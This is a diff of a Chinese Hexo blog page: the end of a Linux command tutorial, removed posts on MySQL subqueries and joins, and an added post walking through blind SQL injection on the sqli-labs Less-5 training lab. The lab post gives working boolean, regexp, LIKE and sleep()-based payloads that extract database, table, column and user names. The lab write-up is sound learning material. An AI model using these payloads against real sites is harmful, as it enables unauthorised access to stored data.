+<p>压缩：tar -jcv -f filename.tar.bz2 要被处理的文件或目录名称<br>查询：tar -jtv -f filename.tar.bz2<br>解压：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录<br>注：文件名并不定要以后缀tar.bz2结尾，这里主要是为了说明使用的压缩程序为bzip2</p>
+<h1 id="13、cat命令"><a href="#13、cat命令" class="headerlink" title="13、cat命令"></a>13、cat命令</h1><p>该命令用于查看文本文件的内容，后接要查看的文件名，通常可用管道与more和less一起使用，从而可以一页页地查看数据。例如：</p>
+<p>cat text | less # 查看text文件中的内容</p>
+<ul>
+<li>注：这条命令也可以使用less text来代替<h1 id="14、chgrp命令"><a href="#14、chgrp命令" class="headerlink" title="14、chgrp命令"></a>14、chgrp命令</h1>该命令用于改变文件所属用户组，它的使用非常简单，它的基本用法如下：</li>
+</ul>
+<p>chgrp [-R] dirname/filename<br>-R ：进行递归的持续对所有文件和子目录更改</p>
+<ul>
+<li>例如：<br>chgrp users -R ./dir # 递归地把dir目录下中的所有文件和子目录下所有文件的用户组修改为users<h1 id="15、chown命令"><a href="#15、chown命令" class="headerlink" title="15、chown命令"></a>15、chown命令</h1>该命令用于改变文件的所有者，与chgrp命令的使用方法相同，只是修改的文件属性不同，不再详述。</li>
+</ul>
+<h1 id="16、chmod命令"><a href="#16、chmod命令" class="headerlink" title="16、chmod命令"></a>16、chmod命令</h1><p>该命令用于改变文件的权限，一般的用法如下：</p>
+<p>chmod [-R] xyz 文件或目录<br>-R：进行递归的持续更改，即连同子目录下的所有文件都会更改<br>同时，chmod还可以使用u（user）、g（group）、o（other）、a（all）和+（加入）、-（删除）、=（设置）跟rwx搭配来对文件的权限进行更改。</p>
+<ul>
+<li>例如：<br>chmod 0755 file # 把file的文件权限改变为-rxwr-xr-x<br>chmod g+w file # 向file的文件权限中加入用户组可写权限<h1 id="18、vim命令"><a href="#18、vim命令" class="headerlink" title="18、vim命令"></a>18、vim命令</h1>该命令主要用于文本编辑，它接一个或多个文件名作为参数，如果文件存在就打开，如果文件不存在就以该文件名创建一个文件。vim是一个非常好用的文本编辑器，它里面有很多非常好用的命令，在这里不再多说。你可以从这里下载vim常用操作的详细说明。</li>
+</ul>
+<h1 id="19、gcc命令"><a href="#19、gcc命令" class="headerlink" title="19、gcc命令"></a>19、gcc命令</h1><p>对于一个用Linux开发C程序的人来说，这个命令就非常重要了，它用于把C语言的源程序文件，编译成可执行程序，由于g++的很多参数跟它非常相似，所以这里只介绍gcc的参数，它的常用参数如下：</p>
+<p>-o ：output之意，用于指定生成一个可执行文件的文件名<br>-c ：用于把源文件生成目标文件（.o)，并阻止编译器创建一个完整的程序<br>-I ：增加编译时搜索头文件的路径<br>-L ：增加编译时搜索静态连接库的路径<br>-S ：把源文件生成汇编代码文件<br>-lm：表示标准库的目录中名为libm.a的函数库<br>-lpthread ：连接NPTL实现的线程库<br>-std= ：用于指定把使用的C语言的版本</p>
+<ul>
+<li>例如：</li>
+<li>把源文件test.c按照c99标准编译成可执行程序test<br>gcc -o test test.c -lm -std=c99<br>*把源文件test.c转换为相应的汇编程序源文件test.s<br>gcc -S test.c<h1 id="20、time命令"><a href="#20、time命令" class="headerlink" title="20、time命令"></a>20、time命令</h1></li>
+</ul>
+<p>该命令用于测算一个命令（即程序）的执行时间。它的使用非常简单，就像平时输入命令一样，不过在命令的前面加入一个time即可，例如：</p>
+<p>time ./process<br>time ps aux<br>在程序或命令运行结束后，在最后输出了三个时间，它们分别是：<br>user：用户CPU时间，命令执行完成花费的用户CPU时间，即命令在用户态中执行时间总和；<br>system：系统CPU时间，命令执行完成花费的系统CPU时间，即命令在核心态中执行时间总和；<br>real：实际时间，从command命令行开始执行到运行终止的消逝时间；</p>
+<h2 id="注：用户CPU时间和系统CPU时间之和为CPU时间，即命令占用CPU执行的时间总和。实际时间要大于CPU时间，因为Linux是多任务操作系统，往往在执行一条命令时，系统还要处理其它任务。另一个需要注意的问题是即使每次执行相同命令，但所花费的时间也是不一样，其花费时间是与系统运行相关的。"><a href="#注：用户CPU时间和系统CPU时间之和为CPU时间，即命令占用CPU执行的时间总和。实际时间要大于CPU时间，因为Linux是多任务操作系统，往往在执行一条命令时，系统还要处理其它任务。另一个需要注意的问题是即使每次执行相同命令，但所花费的时间也是不一样，其花费时间是与系统运行相关的。" class="headerlink" title="注：用户CPU时间和系统CPU时间之和为CPU时间，即命令占用CPU执行的时间总和。实际时间要大于CPU时间，因为Linux是多任务操作系统，往往在执行一条命令时，系统还要处理其它任务。另一个需要注意的问题是即使每次执行相同命令，但所花费的时间也是不一样，其花费时间是与系统运行相关的。"></a>注：用户CPU时间和系统CPU时间之和为CPU时间，即命令占用CPU执行的时间总和。实际时间要大于CPU时间，因为Linux是多任务操作系统，往往在执行一条命令时，系统还要处理其它任务。另一个需要注意的问题是即使每次执行相同命令，但所花费的时间也是不一样，其花费时间是与系统运行相关的。</h2><p>作者：ljianhui<br>来源：CSDN<br>原文：<a href="https://blog.csdn.net/ljianhui/article/details/11100625/" target="_blank" rel="noopener">https://blog.csdn.net/ljianhui/article/details/11100625/</a><br>版权声明：本文为博主原创文章，转载请附上博文链接！</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/21/mysql注入之盲注及sqli-labs05/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/02/21/mysql注入之盲注及sqli-labs05/" class="post-title-link" itemprop="url">mysql注入02及sqli-labs05</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-02-21 16:27:10 / Modified: 22:49:11" itemprop="dateCreated datePublished" datetime="2019-02-21T16:27:10+08:00">2019-02-21</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Mysql注入-sqlilabs/" itemprop="url" rel="index"><span itemprop="name">Mysql注入-sqlilabs</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>mysql注入之盲注<br>主要是我认为简单的一些基于布尔 SQL 盲注，同时将结合实际案例sqli-labs05</p>
+<h1 id="基于布尔-SQL-盲注———-构造逻辑判断"><a href="#基于布尔-SQL-盲注———-构造逻辑判断" class="headerlink" title="基于布尔 SQL 盲注———-构造逻辑判断"></a>基于布尔 SQL 盲注———-构造逻辑判断</h1><h2 id="截取字符及ASCII转换"><a href="#截取字符及ASCII转换" class="headerlink" title="截取字符及ASCII转换"></a>截取字符及ASCII转换</h2><p>left(database(),1)&gt;’s’ //left()函数<br>Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位<br>▲ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))=101 –+ //substr()函数，ascii()函数</p>
+<h3 id="实践："><a href="#实践：" class="headerlink" title="实践："></a>实践：</h3><h4 id="left-函数"><a href="#left-函数" class="headerlink" title="left()函数"></a>left()函数</h4><p>ID:1’ and left(version(),1)=5–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/left1.png" alt=""></p>
+<h4 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h4><p>1.猜测数据库第一位<br> ID: 1’and left(database(),1)&gt;’a’–+<br>Database()为 security，所以我们看他的第一位是否 &gt;a,很明显的是 s&gt;a,因此返回正确。当 我们不知情的情况下，可以用二分法来提高注入的效率。<br>2.猜测数据库第二位 得知第一位为 s，我们看前两位是否大于 sa<br>  ID:1’and left(database(),2)&gt;’sa’–+</p>
+<h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><ol>
+<li>security库下的第一个表： email   e=101 m=109<br>ID:1’and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/1.png" alt=""></li>
+<li>下一个字符，只需将substr（）函数下的第三个参数改为二<br>ID:1’and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/2.png" alt=""></li>
+<li>下一个表，只需将limit中的0，1 改为1，1  依此类推<br>ID:1’and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114–+<br>//此处 114 返回是正确的，因为第二个表示 referers表，所以第一位就是 r.<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/3.png" alt=""><h4 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h4>下一步：表中的列：（一个个查过去比较麻烦，可以用正则来判断表中是否有某个列，针对性较强）<br>爆users表中的列<br>ID:1’and ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 1,1),1,1))=117–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/4.png" alt=""><br>第一个字符为u  可以推测出第一个列为username<h4 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h4>爆username中的数据<br>ID:1’and ascii(substr((select username from users limit 1,1),1,1))=65–+<br>username中的第一行为A开头的用户名<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/5.png" alt=""></li>
+</ol>
+<h2 id="regexp-正则注入"><a href="#regexp-正则注入" class="headerlink" title="regexp 正则注入"></a>regexp 正则注入</h2><h3 id="正则注入介绍："><a href="#正则注入介绍：" class="headerlink" title="正则注入介绍："></a>正则注入介绍：</h3><p><a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5717442.html</a></p>
+<h3 id="用法介绍："><a href="#用法介绍：" class="headerlink" title="用法介绍："></a>用法介绍：</h3><p>select user() regexp ‘^[a-z]’;<br>Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。<br>第二位可以用 select user() regexp ‘^ro’来进行。<br>select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1);</p>
+<h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><p>1.爆表<br>查询库下是否有us开头的表名，<br>ID:1’and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1)–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/正则1.png" alt=""><br>严格匹配库中是否有一个表名为users的表<br>ID:1’and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^users$’ limit 0,1)–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/正则2.png" alt=""><br>2.爆列<br>users表中是否一个username列<br>ID:1’and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^username’ limit 0,1)–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/正则3.png" alt=""><br>users表中是否一个password列<br>ID:1’and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^password’ limit 0,1)–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/正则4.png" alt=""></p>
+<p>3.爆数据<br>username列中是否存在一个用户名为dummy：<br>ID:1’and 1=(select 1 from users where username regexp’^dummy’ limit 0,1)–+<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/正则5.png" alt=""></p>
+<h2 id="like-匹配注入"><a href="#like-匹配注入" class="headerlink" title="like 匹配注入"></a>like 匹配注入</h2><p>和上述的正则类似，mysql 在匹配的时候我们可以用 ike 进行匹配。</p>
+<h3 id="用法：select-user-like-‘ro-’"><a href="#用法：select-user-like-‘ro-’" class="headerlink" title="用法：select user() like ‘ro%’"></a>用法：select user() like ‘ro%’</h3><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>ID:1’and 1=(select 1 from users where username like ‘dummy’ limit 0,1)–+</p>
+<p><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/like.png" alt=""><br>延时注入 利用 sleep()函数进行注入<br><a href="http://127.0.0.1/sqllib/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-5/?id=1&#39;and</a> If(ascii(substr(database(),1,1))=115,1,sleep(5))–+<br>正确时：直接显示页面<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/延时1.png" alt=""><br>错误时，执行sleep（5）<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/延时2.png" alt=""><br>5秒延时后<br><img src="/2019/02/21/mysql注入之盲注及sqli-labs05/延时3.png" alt=""></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/18/Mysql 注入及sqli-labs 01/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1695,773 +2534,6 @@ preg_split -- 用正则表达式分割字符串
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/12/mysql21-子查询/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/12/mysql21-子查询/" class="post-title-link" itemprop="url">mysql21-子查询</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-02-12 16:14:39 / Modified: 16:31:14" itemprop="dateCreated datePublished" datetime="2019-02-12T16:14:39+08:00">2019-02-12</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/mysql/" itemprop="url" rel="index"><span itemprop="name">mysql</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h1><h2 id="子查询与主查询"><a href="#子查询与主查询" class="headerlink" title="子查询与主查询"></a>子查询与主查询</h2><h3 id="子查询概念"><a href="#子查询概念" class="headerlink" title="子查询概念"></a>子查询概念</h3><p>子查询：sub query<br>子查询是一种常用计算机语言SELECT—SQL语言中嵌套查询下层的程序模块。当一个查询是另一个查询的条件时，称之为子查询<br>子查询：指在一条select语句中，嵌入了另外一条select语句，那么被嵌入的select语句称之为子查询语句</p>
-<h3 id="主查询概念"><a href="#主查询概念" class="headerlink" title="主查询概念"></a>主查询概念</h3><p>主查询：主要的查询对象，第一条select语句，确定的用户所有获取的数据目标（数据源）已经要具体得到的字段信息。</p>
-<h3 id="子查询和主查询的关系"><a href="#子查询和主查询的关系" class="headerlink" title="子查询和主查询的关系"></a>子查询和主查询的关系</h3><ol>
-<li>子查询是嵌入到主查询中的</li>
-<li>子查询的辅助查询:要么作为条件，要么作为数据源</li>
-<li>子查询其实可以独立存在：是一条完整的select语句</li>
-</ol>
-<h2 id="子查询分类"><a href="#子查询分类" class="headerlink" title="子查询分类"></a>子查询分类</h2><h3 id="按功能分"><a href="#按功能分" class="headerlink" title="按功能分"></a>按功能分</h3><p>标量子查询：子查询返回的结果是一个数据（一行一列）<br>列子查询：返回的结果是一列（一列多行）<br>行子查询：返回的结果是一行（一行多列）<br>表子查询：返回的结果是多行多列（多行多列）<br>exist子查询：返回的结果是1或者0（类似布尔操作）</p>
-<h3 id="按位置分"><a href="#按位置分" class="headerlink" title="按位置分"></a>按位置分</h3><p>where子查询：子查询出现的位置在where条件中</p>
-<p>from子查询：子查询出现的位置在from数据源中（作数据源）</p>
-<h2 id="标量子查询："><a href="#标量子查询：" class="headerlink" title="标量子查询："></a>标量子查询：</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>子查询返回的结果是一个数据（一行一列）</p>
-<h3 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h3><p>基本语法：select * from 数据源 where 条件判断 =/&lt; &gt; (select 字段名 from 数据源 where条件判断)   //子查询得到的结果只有一个值</p>
-<h2 id="列子查询"><a href="#列子查询" class="headerlink" title="列子查询"></a>列子查询</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>子查询得到的结果是一列数据（一列多行）</p>
-<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>基本语法<br>主查询 where 条件 in（列子查询）；<br><img src="/2019/02/12/mysql21-子查询/列1.png" alt=""><br><img src="/2019/02/12/mysql21-子查询/列2.png" alt=""></p>
-<h2 id="行子查询"><a href="#行子查询" class="headerlink" title="行子查询"></a>行子查询</h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><p>子查询返回的结果是一行多列</p>
-<h3 id="行元素"><a href="#行元素" class="headerlink" title="行元素"></a>行元素</h3><p>行元素：字段元素是指一个字段对应的值，行元素对应的就是多个字段：多个字段合起来作为一个元素参与运算，把这种情况称之为行元素。</p>
-<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>基本语法：<br>主查询 where 条件【（构造一个行元素）】=（行子查询）<br><img src="/2019/02/12/mysql21-子查询/行1.png" alt=""><br>该语句实现了返回身高和年龄最高的学生的信息</p>
-<h3 id="为什么不能用-having-语句："><a href="#为什么不能用-having-语句：" class="headerlink" title="为什么不能用  having 语句："></a>为什么不能用  having 语句：</h3><p>select *from my_student having stu_age=max(stu_age) and stu_height=max(stu_height);<br>原因分析：</p>
-<ol>
-<li>having是在group by之后:使用having代表着前面的group by执行力一次（聚合函数使用）</li>
-<li>group by一旦执行：结果就是只返回一行记录：第一行</li>
-</ol>
-<h3 id="总结：已经学过三个子查询：常见的三个子查询"><a href="#总结：已经学过三个子查询：常见的三个子查询" class="headerlink" title="总结：已经学过三个子查询：常见的三个子查询"></a>总结：已经学过三个子查询：常见的三个子查询</h3><p>标量子查询、列子查询和行子查询：都属于where子查询</p>
-<h2 id="表子查询"><a href="#表子查询" class="headerlink" title="表子查询"></a>表子查询</h2><h3 id="概念-3"><a href="#概念-3" class="headerlink" title="概念"></a>概念</h3><p>表子查询：返回的结果是多行多列，表子查询与行子查询非常相似，只是行子查询需要产生行元素，而表子查询没有。</p>
-<p>行子查询是用于where条件判断：where子查询<br>表子查询是用于from数据源：from子查询</p>
-<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><p>基本语法<br>select 字段表 from （表子查询）as 表名【where】【group by】【limit】<br><img src="/2019/02/12/mysql21-子查询/表1.png" alt=""></p>
-<p>为什么要有as 别名。因为from 后面必须跟着表名，不能没有名字。同时别名也方便后面语句的操作</p>
-<h2 id="exists子查询"><a href="#exists子查询" class="headerlink" title="exists子查询"></a>exists子查询</h2><h3 id="概念-4"><a href="#概念-4" class="headerlink" title="概念"></a>概念</h3><p>exists子查询：查询返回的结果只有0或者1，1戴白哦成立，0代表不成立</p>
-<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><p>基本语法：where exists（查询语句）；   //exists就是根据拆线呢得到的结果进行判断：如果结果存在那么返回1，否则返回0</p>
-<p>where 1：永远为真<br><img src="/2019/02/12/mysql21-子查询/exists.png" alt=""></p>
-<h2 id="子查询中特定关键字的使用"><a href="#子查询中特定关键字的使用" class="headerlink" title="子查询中特定关键字的使用"></a>子查询中特定关键字的使用</h2><h3 id="in"><a href="#in" class="headerlink" title="in"></a>in</h3><p>主查询 where 条件 in （列子查询）</p>
-<h3 id="any"><a href="#any" class="headerlink" title="any"></a>any</h3><p>任意一个<br>=any（列子查询）：条件在查询结果中有任意一个匹配即可，等价于in<br><img src="/2019/02/12/mysql21-子查询/any1.png" alt=""><br>&lt;&gt;any（列子查询）：条件在查询结果中只要不等于其中一个即为true（<strong>即不全等</strong>）<br><img src="/2019/02/12/mysql21-子查询/any2.png" alt=""><br>例如：<br>1 =any（1，2，3）====true<br>1 &lt;&gt;any（1，2，3）====true</p>
-<h3 id="some"><a href="#some" class="headerlink" title="some"></a>some</h3><p>与any完全一样：在国外some与any的正面含义一致，但是否定就大不相同：not any与not some含义不同<br>开发者为了让对应的使用者不要在语法上纠结：重新设计了some</p>
-<h3 id="all"><a href="#all" class="headerlink" title="all"></a>all</h3><p>全部：等于里面的全部<br>=all（列子查询）：表示等于里面的所有<br>&lt;&gt;all（列子查询）：不等于其中所有<br><img src="/2019/02/12/mysql21-子查询/all.png" alt=""></p>
-<p>由于my_class中班级存在3与my_student的班级1和2都不相同，于是修改语句：<br><img src="/2019/02/12/mysql21-子查询/all2.png" alt=""></p>
-<p>如果对应的匹配字段有NULL，那么不参与匹配<br><img src="/2019/02/12/mysql21-子查询/all3.png" alt=""> </p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/12/mysql20-连接查询/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/12/mysql20-连接查询/" class="post-title-link" itemprop="url">mysql20-连接查询</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-02-12 09:38:24 / Modified: 09:51:15" itemprop="dateCreated datePublished" datetime="2019-02-12T09:38:24+08:00">2019-02-12</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/mysql/" itemprop="url" rel="index"><span itemprop="name">mysql</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h1><p>连接查询：将多张表连到一起进行查询（会导致记录数行和字段数列发生改变）</p>
-<h1 id="连接查询的意义"><a href="#连接查询的意义" class="headerlink" title="连接查询的意义"></a>连接查询的意义</h1><p>在关系型数据库设计过程中，实体（表）与实体之间是存在很多联系的。在关系型数据库表的设计过程中，遵循着关系来设计：一对一，一对多和多对多，通常在实际操作的过程中，需要利用这层关系来保证数据的完整性</p>
-<h1 id="连接查询的分类"><a href="#连接查询的分类" class="headerlink" title="连接查询的分类"></a>连接查询的分类</h1><h2 id="交叉连接"><a href="#交叉连接" class="headerlink" title="交叉连接"></a>交叉连接</h2><p>交叉连接：将两张表的数据与另外一张表批次交叉</p>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol>
-<li>从第一张表一次取出一条记录</li>
-<li>去除每一条记录只会，与另外一张表的全部记录挨个匹配</li>
-<li>没有任何匹配条件，所有的结果都会进行保留</li>
-<li>记录数=第一张表记录数*第二张表记录数；字段数=第一张表字段数+第二张表字段数 <h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3>基本语法：表1 cross join 表2；<br><img src="/2019/02/12/mysql20-连接查询/交叉1.png" alt=""></li>
-</ol>
-<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>交叉连接产生的结果是笛卡尔集，没有实际应用。<br>保障连接查询的完整型<br>本质 from 表1，表2； 结果一样</p>
-<h2 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h2><p>内连接：inner join，从一张表中取出所有的记录去另外一张表中匹配：利用匹配条件进行匹配，成功了则保留，失败了放弃</p>
-<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><ol>
-<li>从第一张表中取出一条记录，然后去另外一张表中进行匹配</li>
-<li>利用匹配条件进行匹配<br>2.1匹配到：保留，继续向下匹配<br>2.2匹配失败：向下继续，如果全表匹配失败，结束</li>
-</ol>
-<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>基本语法：表1【inner】join 表2 on 匹配条件</p>
-<ol>
-<li>如果内连接没有条件，那么其实就是交叉连接（避免）<br><img src="/2019/02/12/mysql20-连接查询/内1.png" alt=""></li>
-<li>使用匹配条件进行匹配<br><img src="/2019/02/12/mysql20-连接查询/内2.png" alt=""></li>
-<li>因为表的设计通常容易产生同名字段，尤其是id，所以为了避免重名出现错误，通常使用表名.字段名，来确保唯一性<br><img src="/2019/02/12/mysql20-连接查询/内3.png" alt=""><br>4.通常，如果条件中使用到对应的表名，可以使用表别名进行简化<br><img src="/2019/02/12/mysql20-连接查询/内4.png" alt=""><br>5内连接匹配的时候必须保证匹配到才保存<br><img src="/2019/02/12/mysql20-连接查询/内5.png" alt=""><br>6.内连接因为不强制必须使用匹配条件（on）因此可以在数据匹配完成之后，使用where条件来限制，效果与on一样。（但建议使用on：where等于先全部匹配后再筛选）<br><img src="/2019/02/12/mysql20-连接查询/内6.png" alt=""> <h3 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h3>内连接通常是在对数据有精确要求的地方使用：必须保证两种表中都能进行数据匹配。</li>
-</ol>
-<h2 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h2><p>左外连接（左连接）和右外连接（右连接）<br>外连接：outer join，按照某一张表作为主表（表中所以记录在最后都会保留），根据条件去连接另外一张表，从而得到目标数据</p>
-<p>外连接分为两种:左连接（left join），右外连接（right join）<br><img src="/2019/02/12/mysql20-连接查询/外1.png" alt=""><br>左连接：左表是主表<br><img src="/2019/02/12/mysql20-连接查询/外2.png" alt=""><br>右连接：右表是主表</p>
-<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><ol>
-<li>确定连接主表：左连接就是left join 左边的表为主表，right join就是右边为主表</li>
-<li>拿主表的每一条记录去匹配另外一张表（从表）的每一条记录</li>
-<li>如果满足匹配条件：保留；不满足则不保留</li>
